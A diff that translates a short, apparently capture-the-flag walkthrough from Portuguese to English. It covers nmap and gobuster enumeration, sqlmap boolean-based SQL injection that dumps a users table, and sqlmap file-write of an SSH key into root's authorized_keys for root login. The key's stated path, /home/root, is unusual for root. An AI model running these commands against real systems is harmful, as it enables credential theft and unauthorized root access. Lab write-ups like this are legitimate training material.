@@ -1,7 +1,7 @@
 # Boolean
 > SQL injection boolean-based + authorized_keys
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
@@ -11,11 +11,11 @@ nmap -sC -sV -oN nmap.txt <IP>
 gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
 ```
 
-Formulário de login com campo vulnerável a SQLi.
+Login form with a field vulnerable to SQLi.
 
-## Exploração
+## Exploitation
 
-SQL Injection boolean-based para extração de dados:
+Boolean-based SQL Injection for data extraction:
 
 ```
 sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" --level 3 --risk 2 --dbs
@@ -23,11 +23,11 @@ sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" -D <db> --tables
 sqlmap -u "http://<IP>/login" --data "user=admin&pass=test" -D <db> -T users --dump
 ```
 
-Credenciais obtidas → acesso SSH.
+Credentials obtained → SSH access.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
-Escrita no arquivo `authorized_keys` via SQLi ou credencial comprometida de outro usuário:
+Write to `authorized_keys` via SQLi or compromised credentials of another user:
 
 ```
 sqlmap ... --file-write id_rsa.pub --file-dest /home/root/.ssh/authorized_keys
@@ -37,4 +37,4 @@ sqlmap ... --file-write id_rsa.pub --file-dest /home/root/.ssh/authorized_keys
 ssh -i id_rsa root@<IP>
 ```
 
-Root obtido.
+Root obtained.
